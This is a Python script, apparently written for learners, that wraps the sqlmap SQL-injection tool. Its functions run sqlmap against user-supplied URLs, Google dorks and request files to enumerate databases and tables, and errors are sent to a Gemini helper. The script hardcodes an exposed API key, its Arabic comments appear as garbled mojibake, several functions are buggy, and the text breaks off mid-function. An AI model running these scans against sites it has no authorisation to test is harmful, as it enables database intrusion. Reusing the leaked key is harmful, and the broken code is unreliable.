#╪з┘Д┘Г┘И╪п ╪з┘Ж┘Г╪к╪и ╪и┘И╪з╪│╪╖┘З ┘Е╪н┘Е╪п ╪з┘Д╪╡┘К╪з╪п SayyadN 
#╪з┘Д╪к╪з╪▒┘К╪о : 3-6-2025
#╪з┘Д┘Г┘И╪п ┘Е╪и┘Ж┘К ╪╣┘Д┘К ╪з╪п╪з┘З SQLmap
#╪з╪│╪к╪╣┘Е┘Д┘З ┘Д┘Д╪║╪▒╪╢ ╪з┘Д╪к╪╣┘Д┘Е ┘И┘З╪░╪з ╪з┘Д┘Г┘И╪п ┘К╪│┘З┘Д ╪╣┘Д┘К ╪з┘Д┘Е╪│╪к╪о╪п┘Е ╪з╪│╪╣┘Е╪з┘Д ╪зя╗╗╪п╪з┘З ┘И┘Е╪п┘З┘И┘Е┘З ╪и╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К 
#╪з┘Д┘Г┘И╪п ┘Е┘Б╪к┘И╪н ╪з┘Д┘Е╪╡╪п╪▒ ┘И┘Д┘Г┘Ж ┘Д┘Е╪з ╪к╪з╪о╪п╪о ┘И╪к╪╣╪п┘Д ╪╣┘Д┘К┘З ╪з╪░┘Г╪▒┘Ж┘К ┘Г┘Е╪╡╪п╪▒ ┘И╪з╪п╪╣┘К ╪п╪╣┘И┘З я╗╗┘Е┘К

#╪з╪│╪к┘К╪▒╪з╪п ╪з┘Д┘Е┘Г╪к╪и╪з╪к ╪з┘Д┘Е╪╖┘Д┘И╪и╪й ┘Д┘Д╪╣┘Е┘Д
import subprocess
import os
import google.generativeai as genai
import shutil
import time
import logging

#╪и╪╣╪╢ ╪з┘Д┘Е╪к╪║┘К╪▒╪з╪к ┘Д┘Д╪к╪│┘З┘К┘Д
check = shutil.which
p = print
i = input
c_run = subprocess.run


# ╪з╪│╪к╪и╪п┘Д ┘З╪░╪з ╪и┘Е┘Б╪к╪з╪н API ╪о╪з╪╡ ╪и┘Г ┘Б┘К ╪и┘К╪ж╪й ╪в┘Е┘Ж╪й
API_KEY = "AIzaSyCDXhbDjtMMbKkm0FKGMr3SPAPaQ_aWYBQ"

def ai_help(error_message):
    try:
        # ╪к┘З┘К╪ж╪й ╪з┘Д┘Е┘Г╪к╪и╪й
        genai.configure(api_key=API_KEY)
        model = genai.GenerativeModel("gemini-2.0-flash")

        while True:
            # ╪е╪▒╪│╪з┘Д ╪з┘Д╪▒╪│╪з┘Д╪й ╪е┘Д┘Й ┘Ж┘Е┘И╪░╪м ╪з┘Д╪░┘Г╪з╪б ╪з┘Д╪з╪╡╪╖┘Ж╪з╪╣┘К
            response = model.generate_content(error_message)
            print("\nЁЯФН ╪▒╪п ╪з┘Д╪░┘Г╪з╪б ╪з┘Д╪з╪╡╪╖┘Ж╪з╪╣┘К:")
            print(response.text)

            # ╪│╪д╪з┘Д ╪з┘Д┘Е╪│╪к╪о╪п┘Е
            user_input = input("\n╪к┘В╪п╪▒ ╪к╪о╪▒╪м ┘Д┘Е╪з ╪к┘Г╪к╪и 'exit'. ┘З┘Д ╪к╪▒┘К╪п ╪з┘Д┘Е╪▓┘К╪п ┘Е┘Ж ╪з┘Д┘Е╪│╪з╪╣╪п╪й╪Я (Y/N): ").lower()

            if user_input in ["exit", "n"]:
                print("ЁЯЪк ╪з┘Д╪о╪▒┘И╪м ┘Е┘Ж ╪з┘Д┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г┘К.")
                break
            elif user_input == "y":
                error_message = input("ЁЯза ╪г╪▒┘К╪п ╪з┘Д┘Е╪╣╪▒┘Б╪й ╪╣┘Ж ╪з┘Д┘Е╪┤┘Г┘Д╪й ╪з┘Д╪к┘К ╪╕┘З╪▒╪к: ")
            else:
                print("тЭМ ╪о╪╖╪г ┘Б┘К ╪з┘Д╪е╪п╪о╪з┘Д╪М ╪н╪з┘И┘Д ┘Е╪▒╪й ╪г╪о╪▒┘Й.")
    except Exception as ex:
        print("тЪая╕П ╪з┘Д╪░┘Г╪з╪б ╪з┘Д╪з╪╡╪╖┘Ж╪з╪╣┘К ╪║┘К╪▒ ┘Е╪к┘И┘Б╪▒ ╪н╪з┘Д┘К┘Л╪з.")
        print(f"╪к┘Б╪з╪╡┘К┘Д ╪з┘Д╪о╪╖╪г: {ex}")

#╪з┘Д╪│╪д╪з┘Д ┘Б┘К ╪н╪з┘Д ╪зя╗╗┘Г┘Е╪з┘Д ╪з┘И ╪з┘Д╪о╪▒┘И╪м
def ask_continue(message="┘З┘Д ╪к╪▒┘К╪п ╪н┘В╪з ╪з┘Д╪к┘Г┘Е┘Д┘З? (Y/N): "):
    try:
        while True:
            choice = input(message).strip().lower()
            if choice in ['y', 'yes']:
                return True
            elif choice in ['n', 'no']:
                print("╪м╪▓╪з┘Г ╪з┘Д┘Д┘З ╪о┘К╪▒╪з -- ╪м╪з╪▒┘К ╪з┘Д╪о╪▒┘И╪м...")
                exit(0)
            else:
                print("╪з╪п╪о┘Д ╪о╪з╪╖╪ж ┘И ╪м╪▒╪и 'Y' or 'N'.")
    except Exception as e:
        ai_help(str(e))

#╪│┘Д╪│┘З ╪з┘Д┘Е┘З╪з┘Е ╪з┘Д┘В╪з╪п┘Е┘З ╪│┘К┘Г┘И┘Ж ╪╣┘Ж ╪к╪┤╪║┘К┘Д ╪з┘И╪з┘Е╪▒ ╪зя╗╗╪п╪з┘З ┘И╪к╪н┘Д┘К┘Д ╪з┘Д┘Е╪┤┘Гя╗╗╪к ╪и╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К

# ╪з╪│╪к┘З╪п╪з┘Б URL ┘Е╪╣┘К┘Ж
def target_url():
    try:
        target = i("┘Е┘Ж ┘Б╪╢┘Д┘Г ╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б :")
        cmd = ["sqlmap", "-u", target, "--batch"]
        c_run(cmd)
    except Exception as e:
        p("╪н╪п╪л ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪зя╗╗╪│╪к┘З╪п╪з┘Б")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue()

#╪з┘Д╪з╪к╪╡╪з┘Д ╪з┘Д┘Е╪и╪з╪┤╪▒ ╪и┘В╪з╪╣╪п╪й ╪и┘К╪з┘Ж╪з╪к
def data_direct_conncet():
    try:
        data_url_direct = i("╪г╪п╪о┘Д ╪▒╪з╪и╪╖ ╪зя╗╗╪к╪╡╪з┘Д ╪з┘Д┘Е╪и╪з╪│╪▒ ┘Д┘В╪з╪╣╪п┘З ╪з┘Д╪и┘К╪з┘Ж╪з╪к :")
        cmd = ["sqlmap", "-d", data_url_direct, "--tables"]
        c_run(cmd)
    except Exception as e:
        p("╪н╪п╪л ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪зя╗╗╪к╪╡╪з┘Д")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue()

# ╪к╪н┘Д┘К┘Д ╪│╪м┘Д Log ┘Е┘Ж Burp/WebScarab
def log_analyze():
    try:
        path = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ╪з┘Д┘Е┘Д┘Б ╪з┘Д╪о╪з╪╡")
        cmd = ["sqlmap", "-l", path, "--batch"]
        c_run(cmd)
    except Exception as e:
        p("╪н╪п╪л ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з┘Д╪╣╪л┘И╪▒ ╪╣┘Д┘К ╪з┘Д┘Е┘Д┘Б")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue() 

#┘Б╪н╪╡ ╪╣╪п╪й ╪▒┘И╪з╪и╪╖ ┘Е┘Ж ┘Е┘Д┘Б
def scan_files_url():
    try:
        target_file = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ╪з┘Д┘Е┘Д┘Б :")
        cmd = ["sqlmap", "-m", target_file, "--batch", "--dbs"]
        c_run(cmd)
    except Exception as e:
        p("╪н╪п╪л ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з┘Д╪╣╪л┘И╪▒ ╪╣┘Д┘К ╪з┘Д┘Е┘Д┘Б")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue() 

# ╪к╪н┘Е┘К┘Д ╪╖┘Д╪и HTTP ┘Г╪з┘Е┘Д ┘Е┘Ж ┘Е┘Д┘Б
def http_request():
    try:
        target_file = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ╪з┘Д┘Е┘Д┘Б :")
        cmd = ["sqlmap", "-r", target_file, "--batch", "--current-db"]
        c_run(cmd)
    except Exception as e:
        p("╪н╪п╪л ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з┘Д╪╣╪л┘И╪▒ ╪╣┘Д┘К ╪з┘Д┘Е┘Д┘Б")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue() 

#╪з╪│╪к╪о╪п╪з┘Е Google Dork ┘Г╪г╪п╪з╪й ╪и╪н╪л ╪╣┘Ж ╪г┘З╪п╪з┘Б
def gdrok():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б :") 
        cmd = ["sqlmap", "-g", target_url, "--batch"]
        c_run(cmd)
    except Exception as e:
        p("╪н╪п╪л ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з┘Д╪╣╪л┘И╪▒ ╪╣┘Д┘К ╪з┘Д╪▒╪з╪и╪╖")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue() 

#╪к╪н┘Е┘К┘Д ╪е╪╣╪п╪з╪п╪з╪к ┘Е┘Ж ┘Е┘Д┘Б INI
def ini_setting():
    try:
        target_ini = ("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ╪з┘Д┘Е┘Д┘Б ╪з┘Д┘Е╪╖┘Д┘И╪и ╪з┘Д╪о╪з╪╡ ╪и╪зя╗╗╪╣╪п╪з╪п╪з╪к")
        cmd = ["sqlmap", "-c", target_ini ]
        c_run(cmd)
    except Exception as e:
        p("╪н╪п╪л ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з┘Д╪╣╪л┘И╪▒ ╪╣┘Д┘К ╪з┘Д╪▒╪з╪и╪╖")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue() 

#╪к╪┤╪║┘К┘Д SQLmap ╪и╪г╪│┘Д┘И╪и ┘Е╪▒╪┤╪п ╪к┘Б╪з╪╣┘Д┘К
def tool_wizard():
    try:
        cmd = ["sqlmap", "--wizard"]
        c_run(cmd)
    except Exception as e:
        p("╪о╪╖╪з╪б ╪г╪л┘Ж╪з╪б ╪к╪┤╪║┘К┘Д ╪з┘Д┘Е╪▒╪┤╪п ╪з┘Д╪к┘Б╪з╪╣┘Д┘К")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue() 

#╪к╪н╪п┘К╪л SQLmap ┘Е┘Ж GitHub
def tool_base_update():
    try:
        cmd = ["sqlmap", "--update"]
        c_run(cmd)
    except Exception as e:
        p("╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н╪п┘К╪л ╪зя╗╗╪п╪з┘З")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue() 

#╪н╪░┘Б ┘Г┘Д ╪и┘К╪з┘Ж╪з╪к ╪з┘Д╪к╪┤╪║┘К┘Д ╪з┘Д┘Е╪о╪▓┘Ж╪й
def delete():
    try:
        cmd = ["sqlmap", "--purge"]
        c_run(cmd)
    except Exception as e:
        p("╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪н╪░┘Б ╪и┘К╪з┘Ж╪з╪к ╪з┘Д╪к╪┤╪║┘К┘Д")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue() 

#╪н╪░┘Б ┘Е╪о╪▒╪м╪з╪к ┘Ж╪к╪з╪ж╪м ╪з┘Д┘Б╪н┘И╪╡╪з╪к ╪з┘Д╪│╪з╪и┘В╪й
def out_del():
    try:
        cmd = ["sqlmap", "--purge-output"]
        c_run(cmd)
    except Exception as e:
        p(" ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪н╪░┘Б ╪и┘К╪з┘Ж╪з╪к ┘Е╪о╪▒╪м╪з╪к ╪з┘Д┘Б╪н┘И╪╡╪з╪к ╪з┘Д╪│╪з╪и┘В╪й")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue() 

#╪з┘Д╪к╪н┘В┘В ┘Е┘Ж ╪з┘Д┘Е╪к╪╖┘Д╪и╪з╪к
def req_check():
    try:
        cmd = ["sqlmap", "--dependencies"]
        c_run(cmd)
    except Exception as e:
        p("╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з┘Д╪к╪н┘В┘В ┘Е┘Ж ╪з┘Д┘Е╪к╪╖┘Д╪и╪з╪к")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue() 

#╪╖┘Д╪и ╪з┘Д┘Е╪│╪з╪╣╪п┘З ╪з┘Д╪╣╪з╪п┘К┘З ┘И╪з┘Д┘Е╪к┘В╪п┘Е┘З
def help_n_a():
    try:
        cmd0 = ["sqlmap", "-h"]
        cmd1 = ["sqlmap", "-hh"]
        c_run(cmd0)
        c_run(cmd1)
    except Exception as e:
        p("╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╖┘Д╪и ╪з┘Д┘Е╪│╪з╪╣╪п┘З ╪з┘Д╪╣╪з╪п┘К┘З ┘И╪з┘Д┘Е╪к┘В╪п┘Е┘З ┘Е╪╣╪з┘Л")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue() 

# ╪╣╪▒╪╢ ╪▒┘В┘Е ╪е╪╡╪п╪з╪▒ SQLmap
def sqlmap_version():
    try:
        cmd = ["sqlmap", "--version"]
        c_run(cmd)
    except Exception as e:
        p("╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╣╪▒╪╢ ╪▒┘В┘Е ╪зя╗╗╪╡╪п╪з╪▒ ╪з┘Д╪о╪з╪╡ ╪и╪зя╗╗╪п╪з┘З")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue()

# ╪к┘Б╪╣┘К┘Д ┘Г┘Д ╪о╪╡╪з╪ж╪╡ ╪з┘Д╪к╪н╪│┘К┘Ж
def opt_options():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б : ")
        cmd = ["sqlmap", "-u", target_url , "-o", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Б╪╣┘К┘Д ┘Г┘Д ╪о╪╡╪з╪ж╪╡ ╪з┘Д╪к╪н╪│┘К┘Ж")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue()

# ╪з┘Д╪к┘Ж╪и╪д ╪и┘Е╪о╪▒╪м╪з╪к ╪з┘Д╪з╪│╪к╪╣┘Д╪з┘Е╪з╪к
def pre_out():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б : ")
        cmd = ["sqlmap", "-u", target_url, "--predict-output", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з┘Д╪к┘Ж╪и╪д ╪и╪з┘Д┘Е╪о╪▒╪м╪з╪к ╪з┘Д╪о╪з╪╡┘З ╪и╪зя╗╗╪│╪к╪╣┘Д╪з┘Е╪з╪к ")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue()

# ╪з╪│╪к╪о╪п╪з┘Е ╪з╪к╪╡╪з┘Д HTTP ╪п╪з╪ж┘Е
def http_alive():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б : ")
        cmd = ["sqlmap", "-u", target_url, "--keep-alive", "--batch"]
        c_run(cmd) 
    except Exception as e:
        p("╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з╪и┘В╪з╪б ╪зя╗╗╪к╪╡╪з┘Д ╪п╪з╪ж┘Е")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue()

#╪к╪м╪з┘З┘Д ┘Е╪н╪к┘И┘Й ╪з┘Д╪╡┘Б╪н╪й ┘И╪з┘Д╪к╪▒┘Г┘К╪▓ ╪╣┘Д┘Й ╪з┘Д╪╖┘И┘Д
def ignore_html_content():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б : ")
        cmd = ["sqlmap", "-u", target_url, "--null-connection", "--batch"]
        c_run(cmd) 
    except Exception as e:
        p("╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з╪и┘В╪з╪б ╪зя╗╗╪к╪╡╪з┘Д ╪п╪з╪ж┘Е")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue()

#╪╣╪п╪п ╪з┘Д╪з╪к╪╡╪з┘Д╪з╪к ╪з┘Д┘Е╪к╪▓╪з┘Е┘Ж╪й
def num_threads(threads_num=10):
    try:
        threads_num = i("╪г╪п╪о┘Д ╪╣╪п╪п ╪зя╗╗╪к╪╡╪зя╗╗╪к ╪з┘Д┘Е╪к╪▓╪з┘Е┘Ж┘З ╪з╪л┘Ж╪з╪б ╪з┘Д┘Б╪н╪╡ (╪з┘Д┘В┘К┘Е┘З ╪зя╗╗┘Б╪к╪▒╪з╪╢┘К┘З 10) : ")
        if user_input.strip():  # ┘Д┘И ╪з┘Д┘Е╪│╪к╪о╪п┘Е ┘Г╪к╪и ╪н╪з╪м╪й
            threads_num_user = int(threads_num)
        else:
            threads_num_user = 10  # ┘Д┘И ╪╢╪║╪╖ Enter ╪и╪п┘И┘Ж ╪е╪п╪о╪з┘Д
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б : ")
        cmd = ["sqlmap", "-u", target_url, f"--threads={threads_num}", "--batch"]
        c_run(cmd) 
    except Exception as e:
        p("╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪н╪п┘К╪п ╪зя╗╗╪к╪╡╪з┘Д╪з╪к ╪з┘Д┘Е╪к╪▓╪з┘Е┘Ж┘З")
        logging.error(e)
        p("╪м╪з╪▒┘К ┘Б╪к╪н ┘Е╪│╪з╪╣╪п ╪з┘Д╪░┘Г╪з╪б ╪зя╗╗╪╡╪╖┘Ж╪з╪╣┘К")
        ai_help(str(e))
    ask_continue()

# ╪з╪о╪к╪╡╪з╪▒╪з╪к mnemonics
def use_mnemonics():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        mnemonics = i("╪г╪п╪о┘Д mnemonics (┘Е╪л╪з┘Д: bat,flu): ")
        cmd = ["sqlmap", "-u", target_url, "-z", mnemonics, "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪з╪│╪к╪о╪п╪з┘Е mnemonics.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪г┘Е╪▒ ┘Ж╪╕╪з┘Е ╪╣┘Ж╪п ┘И╪м┘И╪п SQLi
def alert_command():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        alert = i("╪г╪п╪о┘Д ╪г┘Е╪▒ ╪з┘Д┘Ж╪╕╪з┘Е ┘Д┘Д╪к┘Ж┘Б┘К╪░ ╪╣┘Ж╪п ╪з┘Г╪к╪┤╪з┘Б SQLi (┘Е╪л╪з┘Д: notify-send 'SQLi Found'): ")
        cmd = ["sqlmap", "-u", target_url, f"--alert={alert}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪е╪╣╪п╪з╪п ╪г┘Е╪▒ ╪з┘Д╪к┘Ж╪и┘К┘З.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪╡┘И╪к ╪╣┘Ж╪п ╪з┘Г╪к╪┤╪з┘Б ╪л╪║╪▒╪й
def beep_on_found():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--beep", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪┤╪║┘К┘Д ╪з┘Д╪к┘Ж╪и┘К┘З ╪з┘Д╪╡┘И╪к┘К.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣╪╖┘К┘Д ╪г┘Д┘И╪з┘Ж ╪з┘Д╪е╪о╪▒╪з╪м
def disable_coloring():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--disable-coloring", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣╪╖┘К┘Д ╪г┘Д┘И╪з┘Ж ╪з┘Д╪е╪о╪▒╪з╪м.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪╣╪▒╪╢ ╪│┘Г╪▒╪и╪к╪з╪к ╪з┘Д╪к┘Е┘И┘К┘З
def list_tampers():
    try:
        cmd = ["sqlmap", "--list-tampers"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪╣╪▒╪╢ ╪з┘Д╪│┘Г╪▒╪и╪к╪з╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪з┘Д╪╣┘Е┘Д ╪п┘И┘Ж ╪з╪к╪╡╪з┘Д (┘И╪╢╪╣ Offline)
def offline_mode():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--offline", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Б╪╣┘К┘Д ╪з┘Д┘И╪╢╪╣ ╪п┘И┘Ж ╪з╪к╪╡╪з┘Д.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪н┘Б╪╕ ╪з┘Д┘Ж╪к╪з╪ж╪м ╪е┘Д┘Й ┘Е┘Д┘Б CSV
def results_to_file():
    try:
        targets_file = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ┘Е┘Д┘Б ┘К╪н╪к┘И┘К ╪╣┘Д┘Й ╪▒┘И╪з╪и╪╖ ┘Е╪│╪к┘З╪п┘Б╪й (┘Г┘Д ╪▒╪з╪и╪╖ ┘Б┘К ╪│╪╖╪▒): ")
        results_file = i("╪г╪п╪о┘Д ╪з╪│┘Е ┘Е┘Д┘Б ╪з┘Д┘Ж╪к╪з╪ж╪м (┘Е╪л╪з┘Д: results.csv): ")
        cmd = ["sqlmap", "-m", targets_file, f"--results-file={results_file}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪н┘Б╪╕ ╪з┘Д┘Ж╪к╪з╪ж╪м.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪┤╪║┘К┘Д ┘И╪з╪м┘З╪й Shell
def sqlmap_shell():
    try:
        cmd = ["sqlmap", "--shell"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪┤╪║┘К┘Д ╪з┘Д┘И╪з╪м┘З╪й ╪з┘Д╪к┘Б╪з╪╣┘Д┘К╪й.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ┘Е╪м┘Д╪п ┘Е╪д┘В╪к
def set_tmp_dir():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        tmp_dir = i("╪г╪п╪о┘Д ┘Е╪│╪з╪▒ ╪з┘Д┘Е╪м┘Д╪п ╪з┘Д┘Е╪д┘В╪к (┘Е╪л╪з┘Д: ./tmp): ")
        cmd = ["sqlmap", "-u", target_url, f"--tmp-dir={tmp_dir}", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к╪╣┘К┘К┘Ж ╪з┘Д┘Е╪м┘Д╪п ╪з┘Д┘Е╪д┘В╪к.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪╣╪п┘К┘Д ╪з┘Д╪з╪к╪╡╪з┘Д ╪з┘Д╪║┘К╪▒ ┘Е╪│╪к┘В╪▒
def unstable_mode():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
        cmd = ["sqlmap", "-u", target_url, "--unstable", "--batch"]
        c_run(cmd)
    except Exception as e:
        p("тЪая╕П ╪о╪╖╪г ╪г╪л┘Ж╪з╪б ╪к┘Б╪╣┘К┘Д ┘И╪╢╪╣ ╪з┘Д╪з╪к╪╡╪з┘Д ╪║┘К╪▒ ╪з┘Д┘Е╪│╪к┘В╪▒.")
        logging.error(e)
        ai_help(str(e))
    ask_continue()

# ╪к╪н╪п┘К╪п ╪к┘В┘Ж┘К╪з╪к SQLi ╪з┘Д┘Е╪│╪к╪о╪п┘Е╪й
def choose_technique():
    try:
        target_url = i("╪г╪п╪о┘Д ╪з┘Д╪▒╪з╪и╪╖ ╪з┘Д┘Е╪│╪к┘З╪п┘Б: ")
